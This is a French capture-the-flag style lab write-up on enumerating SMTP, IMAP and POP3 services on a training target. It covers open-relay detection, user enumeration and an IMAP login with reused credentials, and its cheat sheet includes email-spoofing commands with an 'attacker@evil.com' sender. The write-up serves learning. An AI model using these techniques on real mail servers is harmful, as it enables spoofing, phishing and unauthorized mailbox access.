**Contexte :** Pour éviter que les emails soient filtrés comme spam, l'expéditeur peut utiliser un **serveur relay de confiance**. Normalement, l'expéditeur doit **s'authentifier** avant d'utiliser le relay.

**Le problème que j'ai identifié :**

Les administrateurs **n'ont pas toujours une vue claire** des plages IP à autoriser. Pour éviter des erreurs dans le trafic email et ne pas interrompre la communication avec les clients, ils autorisent **toutes les IPs**.

**Configuration vulnérable :**
```
mynetworks = 0.0.0.0/0
```

**Impact de cette configuration :**

| Risque | Exploitation |
|--------|--------------|
| **Envoi d'emails forgés** | Usurpation d'identité (spoofing) |
| **Spam en masse** | Utilisation comme relay pour spam |
| **Phishing** | Emails semblant provenir d'un serveur légitime |
| **Communication interceptée** | Man-in-the-middle possible |

> mynetworks = 0.0.0.0/0 signifie que TOUT LE MONDE peut utiliser ce serveur pour envoyer des emails
{: .prompt-danger}

**Mon analyse stratégique :**

Avec un Open Relay, je peux :
1. Envoyer des emails en me faisant passer pour n'importe qui
2. Utiliser la réputation du serveur légitime
3. Bypasser les filtres anti-spam
4. Lancer des campagnes de phishing crédibles

### Énumération SMTP avec Nmap

#### Scan basique avec scripts par défaut

**Ma commande :**
```bash
sudo nmap 10.129.14.128 -sC -sV -p25
```

**Résultat obtenu :**
```
PORT   STATE SERVICE VERSION
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: mail1.inlanefreight.htb, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING,
```

**Mon analyse :**

Le script **smtp-commands** utilise la commande `EHLO` pour lister toutes les commandes disponibles :
- Serveur : **Postfix**
- Hostname : **mail1.inlanefreight.htb**
- Commandes supportées listées (PIPELINING, SIZE, VRFY, etc.)

> Nmap découvre automatiquement les capacités ESMTP du serveur
{: .prompt-tip}

#### Détection d'Open Relay avec Nmap

**Ma commande de test Open Relay :**
```bash
sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v
```

**Résultat détaillé obtenu :**
```
PORT   STATE SERVICE
25/tcp open  smtp
| smtp-open-relay: Server is an open relay (16/16 tests)
|  MAIL FROM:<> -> RCPT TO:<relaytest@nmap.scanme.org>
|  MAIL FROM:<antispam@nmap.scanme.org> -> RCPT TO:<relaytest@nmap.scanme.org>
|  MAIL FROM:<antispam@ESMTP> -> RCPT TO:<relaytest@nmap.scanme.org>
|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<relaytest@nmap.scanme.org>
|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<relaytest%nmap.scanme.org@[10.129.14.128]>
|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<relaytest%nmap.scanme.org@ESMTP>
|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<"relaytest@nmap.scanme.org">
|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<"relaytest%nmap.scanme.org">
|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<relaytest@nmap.scanme.org@[10.129.14.128]>
|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<"relaytest@nmap.scanme.org"@[10.129.14.128]>
|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<relaytest@nmap.scanme.org@ESMTP>
|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<@[10.129.14.128]:relaytest@nmap.scanme.org>
|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<@ESMTP:relaytest@nmap.scanme.org>
|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<nmap.scanme.org!relaytest>
|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<nmap.scanme.org!relaytest@[10.129.14.128]>
|_ MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<nmap.scanme.org!relaytest@ESMTP>
```

**Mon analyse détaillée des tests :**

Le script **smtp-open-relay** effectue **16 tests différents** pour vérifier si le serveur accepte de relayer des emails vers des domaines externes (`nmap.scanme.org`).

**Résultat : 16/16 tests réussis** → Le serveur est un **Open Relay confirmé** !

**Types de tests effectués :**

1. **Test basique** : `MAIL FROM:<>` (expéditeur vide)
2. **Test avec domaine externe** : `MAIL FROM:<antispam@nmap.scanme.org>`
3. **Test avec IP** : `MAIL FROM:<antispam@[10.129.14.128]>`
4. **Test avec encodage spécial** : `relaytest%nmap.scanme.org`
5. **Test avec quotes** : `"relaytest@nmap.scanme.org"`
6. **Test avec routing** : `@[10.129.14.128]:relaytest@nmap.scanme.org`
7. **Test avec notation UUCP** : `nmap.scanme.org!relaytest`

> Si Nmap affiche "Server is an open relay", le serveur peut être abusé pour envoyer du spam et du phishing
{: .prompt-danger}

### Ce que je retiens sur l'énumération SMTP

#### Méthodologie complète

**Mon workflow SMTP :**

1. **Scan Nmap initial** → Identifier le service et les commandes supportées
2. **Test Open Relay** → Vérifier la vulnérabilité critique
3. **Connexion Telnet** → Interaction manuelle avec le serveur
4. **EHLO** → Découvrir les capacités ESMTP
5. **VRFY/EXPN** → Tenter l'énumération d'utilisateurs
6. **Test d'envoi d'email** → Vérifier si le spoofing est possible
7. **Analyse des headers** → Étudier les emails reçus pour forensics

#### Vulnérabilités critiques identifiées

**Classement par gravité :**

| Vulnérabilité | Impact | Exploitation |
|---------------|--------|--------------|
| **Open Relay** | Spam, phishing, spoofing | Triviale (Nmap détecte) |
| **VRFY activé** | Énumération d'utilisateurs | Facile si bien configuré |
| **Pas de chiffrement** | Interception credentials | MITM sur réseau local |
| **Pas d'authentification** | Spoofing d'emails | Triviale via Telnet |
| **SPF/DKIM mal configurés** | Usurpation de domaine | Moyenne |

#### Commandes essentielles

**Aide-mémoire SMTP :**
```bash
# Scan Nmap basique
nmap -sC -sV -p25,587,465 <target>

# Test Open Relay
nmap -p25 --script smtp-open-relay <target>

# Énumération des commandes
nmap -p25 --script smtp-commands <target>

# Connexion manuelle
telnet <target> 25

# Énumération utilisateurs (si VRFY activé)
smtp-user-enum -M VRFY -U users.txt -t <target>

# Session interactive
EHLO test
VRFY root
MAIL FROM: <attacker@evil.com>
RCPT TO: <victim@target.com>
DATA
[contenu]
.
QUIT
```

#### Outils complémentaires

**Outils spécialisés SMTP que je peux utiliser :**

| Outil | Usage | Commande |
|-------|-------|----------|
| **smtp-user-enum** | Énumération utilisateurs | `smtp-user-enum -M VRFY -U users.txt -t target` |
| **swaks** | Swiss Army Knife for SMTP | `swaks --to user@target --from attacker@evil.com` |
| **sendemail** | Envoi d'emails scriptés | `sendemail -f from@evil.com -t to@target` |
| **Metasploit** | Module SMTP | `use auxiliary/scanner/smtp/smtp_enum` |

> SMTP est l'un des protocoles les plus permissifs par défaut - parfait pour le pentest, terrible pour la sécurité
{: .prompt-tip}

---

**Enumerate the SMTP service and submit the banner, including its version as the answer.**

Déjà nous allons commencer par faire un scan nmap pour voir sur quel port nous pouvons nous connecter avec `telnet`

```bash
└──╼ [★]$ sudo nmap -sC -sV 10.129.48.31
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-23 09:04 CST
Nmap scan report for 10.129.48.31
Host is up (0.045s latency).
Not shown: 992 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
25/tcp   open  smtp     Postfix smtpd
| ssl-cert: Subject: commonName=inlanefreight.htb/organizationName=Inlanefreight Ltd./stateOrProvinceName=Berlin/countryName=DE
| Not valid before: 2021-11-08T22:26:24
|_Not valid after:  2295-08-23T22:26:24
|_smtp-commands: mail1, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp   open  domain   ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
110/tcp  open  pop3     Dovecot pop3d
|_pop3-capabilities: AUTH-RESP-CODE STLS RESP-CODES TOP CAPA SASL UIDL PIPELINING
| ssl-cert: Subject: commonName=dev.inlanefreight.htb/organizationName=InlaneFreight Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-11-08T23:10:05
|_Not valid after:  2295-08-23T23:10:05
143/tcp  open  imap     Dovecot imapd
|_imap-capabilities: more LITERAL+ ID OK post-login IMAP4rev1 listed capabilities IDLE Pre-login have STARTTLS ENABLE LOGIN-REFERRALS SASL-IR LOGINDISABLEDA0001
| ssl-cert: Subject: commonName=dev.inlanefreight.htb/organizationName=InlaneFreight Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-11-08T23:10:05
|_Not valid after:  2295-08-23T23:10:05
993/tcp  open  ssl/imap Dovecot imapd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dev.inlanefreight.htb/organizationName=InlaneFreight Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-11-08T23:10:05
|_Not valid after:  2295-08-23T23:10:05
|_imap-capabilities: LITERAL+ ID more OK IMAP4rev1 post-login listed IDLE Pre-login have capabilities ENABLE LOGIN-REFERRALS SASL-IR AUTH=PLAINA0001
995/tcp  open  ssl/pop3 Dovecot pop3d
| ssl-cert: Subject: commonName=dev.inlanefreight.htb/organizationName=InlaneFreight Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-11-08T23:10:05
|_Not valid after:  2295-08-23T23:10:05
|_pop3-capabilities: AUTH-RESP-CODE SASL(PLAIN) RESP-CODES TOP CAPA USER UIDL PIPELINING
|_ssl-date: TLS randomness does not represent time
3306/tcp open  mysql    MySQL 8.0.27-0ubuntu0.20.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.27-0ubuntu0.20.04.1
|   Thread ID: 10
|   Capabilities flags: 65535
|   Some Capabilities: SupportsLoadDataLocal, LongColumnFlag, InteractiveClient, ConnectWithDatabase, Speaks41ProtocolOld, Speaks41ProtocolNew, SupportsCompression, Support41Auth, SupportsTransactions, IgnoreSpaceBeforeParenthesis, LongPassword, ODBCClient, DontAllowDatabaseTableColumn, IgnoreSigpipes, SwitchToSSLAfterHandshake, FoundRows, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: \x17Z\x07n\\x16W4%;T'D\x03I\x08A\x06sJ
|_  Auth Plugin Name: caching_sha2_password
Service Info: Host: InFreight; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.25 seconds
```

Bon nous voyons pas mal de ports mais nous allons essayer de nous connecter au 25, la base

```bash
└──╼ [★]$ sudo nmap -p25 -sC -sV 10.129.48.31
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-23 09:07 CST
Stats: 0:00:57 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 75.00% done; ETC: 09:08 (0:00:05 remaining)
Stats: 0:01:00 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 75.00% done; ETC: 09:08 (0:00:06 remaining)
Nmap scan report for 10.129.48.31
Host is up (0.043s latency).

PORT   STATE SERVICE VERSION
25/tcp open  smtp
| fingerprint-strings: 
|   Hello: 
|     220 InFreight ESMTP v2.11
|_    Syntax: EHLO hostname
|_smtp-commands: mail1, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port25-TCP:V=7.94SVN%I=7%D=11/23%Time=69232331%P=x86_64-pc-linux-gnu%r(
SF:Hello,36,"220\x20InFreight\x20ESMTP\x20v2\.11\r\n501\x20Syntax:\x20EHLO
SF:\x20hostname\r\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.33 seconds
```

Nous voyons qu'il y a des commandes de disponibles donc nous allons essayer de nous y connecter

```bash
└──╼ [★]$ telnet 10.129.48.31 25
Trying 10.129.48.31...
Connected to 10.129.48.31.
Escape character is '^]'.
VRFY
220 InFreight ESMTP v2.11
501 5.5.4 Syntax: VRFY address [SMTPUTF8]
```

**Réponse :** `InFreight ESMTP v2.11`

**Enumerate the SMTP service even further and find the username that exists on the system. Submit it as the answer.**

Nous allons chercher un nom d'utilisateur qui existe sur le système en se servant de **Metasploit**

voici comment j'ai fait:

```bash
use scanner/smtp/smtp_enum
```

```bash
set rhosts 10.129.48.31
```

```bash
[msf](Jobs:0 Agents:0) auxiliary(scanner/smtp/smtp_enum) >> show options

Module options (auxiliary/scanner/smtp/smtp_enum):

   Name       Current Setting                                        Required  Description
   ----       ---------------                                        --------  -----------
   RHOSTS     10.129.48.31                                           yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.ht
                                                                               ml
   RPORT      25                                                     yes       The target port (TCP)
   THREADS    1                                                      yes       The number of concurrent threads (max one per host)
   UNIXONLY   true                                                   yes       Skip Microsoft bannered servers when testing unix users
   USER_FILE  /usr/share/metasploit-framework/data/wordlists/unix_u  yes       The file that contains a list of probable users accounts.
              sers.txt


View the full module info with the info, or info -d command.
```

Ensuite dans le module nous avons un fichier qui nous ai donné qui est une liste de nom a utiliser et je l'ai copié sur ma machine dans un fichier nommé `user.txt` puis je l'ai utilisé dans **metasploit**

```bash
set user_file /home/htb-ac-1999270/user.txt
```

```bash
[msf](Jobs:0 Agents:0) auxiliary(scanner/smtp/smtp_enum) >> run
[*] 10.129.48.31:25       - 10.129.48.31:25 Banner: 220 InFreight ESMTP v2.11
[+] 10.129.48.31:25       - 10.129.48.31:25 Users found: , robin
[*] 10.129.48.31:25       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

**Réponse :** `robin`

---

## IMAP / POP3

### Différence entre IMAP et POP3

Avant de plonger dans l'énumération, j'ai d'abord compris la différence fondamentale entre ces deux protocoles de messagerie.

> **Pour les débutants** : IMAP et POP3 sont deux protocoles qui permettent de récupérer ses emails depuis un serveur de messagerie, mais ils fonctionnent différemment.
{: .prompt-info}

**IMAP (Internet Message Access Protocol)** permet de gérer les emails **directement sur le serveur**. C'est comme avoir un disque dur réseau pour ses emails. Les fonctionnalités incluent :

- Gestion en ligne des emails
- Support des structures de dossiers
- Synchronisation entre plusieurs clients
- Les emails restent sur le serveur jusqu'à suppression

**POP3 (Post Office Protocol 3)** est beaucoup plus basique :

- Liste les emails
- Récupère les emails
- Supprime les emails du serveur
- Pas de gestion de dossiers
- Pas de synchronisation multi-clients

### Fonctionnement technique d'IMAP

Ce qui m'a intéressé, c'est qu'IMAP utilise des **commandes textuelles en ASCII**. Le client se connecte via le **port 143** (ou **993 pour IMAPS avec SSL/TLS**).

La séquence de connexion typique :
1. Établissement de la connexion
2. Authentification par nom d'utilisateur et mot de passe
3. Accès aux boîtes aux lettres après authentification réussie

> **Attention** : Sans chiffrement, IMAP transmet les identifiants et emails **en clair**. C'est pourquoi IMAPS (port 993) est préférable.
{: .prompt-danger}

### Commandes IMAP

Voici les commandes que j'ai testées pour interagir avec un serveur IMAP :

| Commande | Description | Mon usage |
|----------|-------------|-----------|
| `1 LOGIN username password` | Connexion utilisateur | Authentification initiale |
| `1 LIST "" *` | Liste tous les répertoires | Découverte de la structure |
| `1 CREATE "INBOX"` | Crée une boîte aux lettres | Rarement utilisé en pentest |
| `1 DELETE "INBOX"` | Supprime une boîte aux lettres | Action destructive |
| `1 RENAME "ToRead" "Important"` | Renomme une boîte | Manipulation de structure |
| `1 SELECT INBOX` | Sélectionne une boîte | Obligatoire avant lecture |
| `1 FETCH <ID> all` | Récupère un message | Lecture des emails |
| `1 LOGOUT` | Ferme la connexion | Fin de session |

### Commandes POP3

POP3 utilise des commandes plus simples via le **port 110** (ou **995 pour POP3S**) :

| Commande | Description |
|----------|-------------|
| `USER username` | Identification de l'utilisateur |
| `PASS password` | Authentification par mot de passe |
| `STAT` | Nombre d'emails sauvegardés |
| `LIST` | Nombre et taille de tous les emails |
| `RETR id` | Récupère un email par ID |
| `DELE id` | Supprime un email par ID |
| `QUIT` | Ferme la connexion |

### Configurations dangereuses

Lors de mes tests, j'ai découvert que certaines configurations peuvent exposer des informations sensibles :

| Paramètre | Risque |
|-----------|--------|
| `auth_debug` | Active le logging complet de l'authentification |
| `auth_debug_passwords` | **Les mots de passe sont loggés** |
| `auth_verbose` | Logs des tentatives d'authentification échouées |
| `auth_anonymous_username` | Permet la connexion anonyme |

> Ces paramètres sont particulièrement dangereux dans un serveur mal configuré car ils peuvent révéler des identifiants en clair dans les logs.
{: .prompt-warning}

### Énumération avec Nmap

J'ai scanné un serveur de messagerie pour identifier les services actifs :
```bash
sudo nmap 10.129.14.128 -sV -p110,143,993,995 -sC
```

**Résultat :**
```
PORT    STATE SERVICE  VERSION
110/tcp open  pop3     Dovecot pop3d
143/tcp open  imap     Dovecot imapd
993/tcp open  ssl/imap Dovecot imapd
995/tcp open  ssl/pop3 Dovecot pop3d
```

**Mon observation :** Le scan révèle plusieurs informations précieuses :

- Le serveur utilise **Dovecot** comme serveur de messagerie
- Les certificats SSL exposent le **Common Name** : `mail1.inlanefreight.htb`
- L'organisation : **Inlanefreight** basée en **Californie**
- Les **capabilities** listées montrent les commandes disponibles

> Les capabilities IMAP comme `AUTH=PLAIN` indiquent que le serveur accepte l'authentification en texte clair, ce qui est exploitable si on capture le trafic.
{: .prompt-tip}

### Interaction avec cURL

Pour interagir rapidement avec un serveur IMAP, j'ai utilisé `curl` :
```bash
curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd
```

**Résultat :**
```
* LIST (\HasNoChildren) "." Important
* LIST (\HasNoChildren) "." INBOX
```

Avec l'option verbose (`-v`), j'obtiens beaucoup plus d'informations :
```bash
curl -k 'imaps://10.129.14.128' --user cry0l1t3:1234 -v
```

**Ce que j'ai appris :**

- Version **TLSv1.3** utilisée
- Cipher : **TLS_AES_256_GCM_SHA384**
- Détails complets du certificat SSL
- Le **banner** révèle : `HTB-Academy IMAP4 v.0.21.4`
- Les capabilities post-login sont beaucoup plus étendues

> Le banner peut révéler la version exacte du serveur, utile pour rechercher des vulnérabilités connues.
{: .prompt-info}

### Connexion chiffrée avec OpenSSL

Pour interagir manuellement avec un serveur via SSL/TLS, j'ai utilisé `openssl` :

**POP3S (port 995) :**
```bash
openssl s_client -connect 10.129.14.128:pop3s
```

**IMAPS (port 993) :**
```bash
openssl s_client -connect 10.129.14.128:imaps
```

**Mon observation :** Ces connexions montrent :

- La négociation complète du handshake TLS
- Les détails du certificat (émetteur, dates de validité)
- Le protocol utilisé (**TLSv1.3**)
- Le banner du serveur après connexion réussie

Une fois connecté, je peux utiliser les commandes IMAP/POP3 directement dans cette session chiffrée.

### Cas pratique : Exploitation d'identifiants faibles

Dans la section SMTP précédente, j'avais découvert l'utilisateur **robin**. Un autre membre de l'équipe a trouvé que cet utilisateur réutilise son nom d'utilisateur comme mot de passe : **robin:robin**.

> **Astuce de pentest** : La réutilisation d'identifiants entre services est très courante. Toujours tester les credentials découverts sur d'autres services.
{: .prompt-tip}

J'ai testé ces identifiants sur IMAP :
```bash
curl -k 'imaps://10.129.14.128' --user robin:robin
```

Si la connexion réussit, je peux maintenant :

1. Lister tous les dossiers de robin
2. Lire ses emails (potentiellement sensibles)
3. Rechercher des informations confidentielles
4. Découvrir d'autres utilisateurs ou systèmes mentionnés dans les emails

### Points importants à retenir

Lors de l'énumération de serveurs de messagerie, je privilégie systématiquement :

1. **Nmap** pour la découverte initiale et l'identification des services
2. **cURL** pour des tests rapides d'authentification
3. **OpenSSL** pour l'interaction manuelle et l'analyse détaillée
4. La vérification des certificats SSL pour l'OSINT (noms de domaine, organisations)
5. Le test des identifiants découverts sur d'autres services

Pour aller plus loin sur IMAP, consulter la [RFC 3501 - IMAP4rev1](https://www.rfc-editor.org/rfc/rfc3501.html) et la [documentation Dovecot](https://doc.dovecot.org/).

---

**Figure out the exact organization name from the IMAP/POP3 service and submit it as the answer.**

Ok nous allons donner le nom exacte de l'organisation grâce a un scan nmap

```bash
Nmap scan report for 10.129.65.62
Host is up (0.058s latency).
Not shown: 992 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
25/tcp   open  smtp
|_smtp-commands: mail1, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
| fingerprint-strings: 
|   Hello: 
|     220 InFreight ESMTP v2.11
|_    Syntax: EHLO hostname
53/tcp   open  domain   ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
110/tcp  open  pop3     Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: SASL PIPELINING STLS AUTH-RESP-CODE UIDL CAPA RESP-CODES TOP
| ssl-cert: Subject: commonName=dev.inlanefreight.htb/organizationName=InlaneFreight Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-11-08T23:10:05
|_Not valid after:  2295-08-23T23:10:05
143/tcp  open  imap     Dovecot imapd
| ssl-cert: Subject: commonName=dev.inlanefreight.htb/organizationName=InlaneFreight Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-11-08T23:10:05
|_Not valid after:  2295-08-23T23:10:05
|_imap-capabilities: more IMAP4rev1 IDLE have post-login listed capabilities LOGINDISABLEDA0001 LITERAL+ OK SASL-IR Pre-login STARTTLS ENABLE ID LOGIN-REFERRALS
|_ssl-date: TLS randomness does not represent time
993/tcp  open  ssl/imap Dovecot imapd
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: IMAP4rev1 IDLE more AUTH=PLAINA0001 have post-login listed LITERAL+ capabilities SASL-IR Pre-login LOGIN-REFERRALS ENABLE OK ID
| ssl-cert: Subject: commonName=dev.inlanefreight.htb/organizationName=InlaneFreight Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-11-08T23:10:05
|_Not valid after:  2295-08-23T23:10:05
995/tcp  open  ssl/pop3 Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dev.inlanefreight.htb/organizationName=InlaneFreight Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-11-08T23:10:05
|_Not valid after:  2295-08-23T23:10:05
|_pop3-capabilities: SASL(PLAIN) USER PIPELINING AUTH-RESP-CODE UIDL CAPA RESP-CODES TOP
3306/tcp open  mysql    MySQL 8.0.27-0ubuntu0.20.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.27-0ubuntu0.20.04.1
|   Thread ID: 10
|   Capabilities flags: 65535
|   Some Capabilities: ConnectWithDatabase, SupportsCompression, FoundRows, Speaks41ProtocolOld, Support41Auth, LongColumnFlag, IgnoreSigpipes, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, SwitchToSSLAfterHandshake, ODBCClient, LongPassword, SupportsTransactions, InteractiveClient, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: z\x0BtRMu;qBg*)\x02\x16\x08'[FZf
|_  Auth Plugin Name: caching_sha2_password
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port25-TCP:V=7.94SVN%I=7%D=11/24%Time=6924E865%P=x86_64-pc-linux-gnu%r(
SF:Hello,36,"220\x20InFreight\x20ESMTP\x20v2\.11\r\n501\x20Syntax:\x20EHLO
SF:\x20hostname\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 437.85 seconds
```

Nous voyons le port `110 sur pop3`, `143 sur imap`, `993 sur ssl/imap` et `995 sur ssl/pop3`

Mais ce qui nous intéresse pour le moment c'est le texte que contiennent les port SSL:

```bash
993/tcp  open  ssl/imap Dovecot imapd
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: IMAP4rev1 IDLE more AUTH=PLAINA0001 have post-login listed LITERAL+ capabilities SASL-IR Pre-login LOGIN-REFERRALS ENABLE OK ID
| ssl-cert: Subject: commonName=dev.inlanefreight.htb/organizationName=InlaneFreight Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-11-08T23:10:05
|_Not valid after:  2295-08-23T23:10:05
```

```bash
995/tcp  open  ssl/pop3 Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dev.inlanefreight.htb/organizationName=InlaneFreight Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-11-08T23:10:05
|_Not valid after:  2295-08-23T23:10:05
|_pop3-capabilities: SASL(PLAIN) USER PIPELINING AUTH-RESP-CODE UIDL CAPA RESP-CODES TOP
```

Ici nous avons toute les infos sur le certificat

**Réponse :** `InlaneFreight Ltd`

**What is the FQDN that the IMAP and POP3 servers are assigned to?**

Nous voyons avec la valeur juste au dessu le FQDN (Fully Qualified Domain Name) avec la valeur `commonName`

**Réponse :** `dev.inlanefreight.htb`

**Enumerate the IMAP service and submit the flag as the answer. (Format: HTB{...})**

Nous allons donc procéder a une énumeration du service IMAP avec curl comme dans le cours:

```bash
└──╼ [★]$ curl -k 'imaps://10.129.65.62' --user robin:robin
* LIST (\Noselect \HasChildren) "." DEV
* LIST (\Noselect \HasChildren) "." DEV.DEPARTMENT
* LIST (\HasNoChildren) "." DEV.DEPARTMENT.INT
* LIST (\HasNoChildren) "." INBOX
```

J'ai mis l'utilisateur `robin` avec le mot de passe `robin` comme dit dans le cours, et voici ce que ça donne en **mode verbose**

```bash
└──╼ [★]$ curl -k 'imaps://10.129.65.62' --user robin:robin -v
*   Trying 10.129.65.62:993...
* Connected to 10.129.65.62 (10.129.65.62) port 993 (#0)
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
* TLSv1.3 (IN), TLS handshake, Certificate (11):
* TLSv1.3 (IN), TLS handshake, CERT verify (15):
* TLSv1.3 (IN), TLS handshake, Finished (20):
* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.3 (OUT), TLS handshake, Finished (20):
* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384
* Server certificate:
*  subject: C=UK; ST=London; L=London; O=InlaneFreight Ltd; OU=DevOps Dep�artment; CN=dev.inlanefreight.htb; emailAddress=cto.dev@dev.inlanefreight.htb
*  start date: Nov  8 23:10:05 2021 GMT
*  expire date: Aug 23 23:10:05 2295 GMT
*  issuer: C=UK; ST=London; L=London; O=InlaneFreight Ltd; OU=DevOps Dep�artment; CN=dev.inlanefreight.htb; emailAddress=cto.dev@dev.inlanefreight.htb
*  SSL certificate verify result: self-signed certificate (18), continuing anyway.
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* old SSL session ID is stale, removing
< * OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] HTB{roncfbw7iszerd7shni7jr2343zhrj}
> A001 CAPABILITY
< * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN
< A001 OK Pre-login capabilities listed, post-login capabilities have more.
> A002 AUTHENTICATE PLAIN AHJvYmluAHJvYmlu
< * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE
< A002 OK Logged in
> A003 LIST "" *
< * LIST (\Noselect \HasChildren) "." DEV
* LIST (\Noselect \HasChildren) "." DEV
< * LIST (\Noselect \HasChildren) "." DEV.DEPARTMENT
* LIST (\Noselect \HasChildren) "." DEV.DEPARTMENT
< * LIST (\HasNoChildren) "." DEV.DEPARTMENT.INT
* LIST (\HasNoChildren) "." DEV.DEPARTMENT.INT
< * LIST (\HasNoChildren) "." INBOX
* LIST (\HasNoChildren) "." INBOX
< A003 OK List completed (0.001 + 0.000 secs).
* Connection #0 to host 10.129.65.62 left intact
```

Et comme nous pouvons le voir dans la dernière commande il y a notre flag cherché

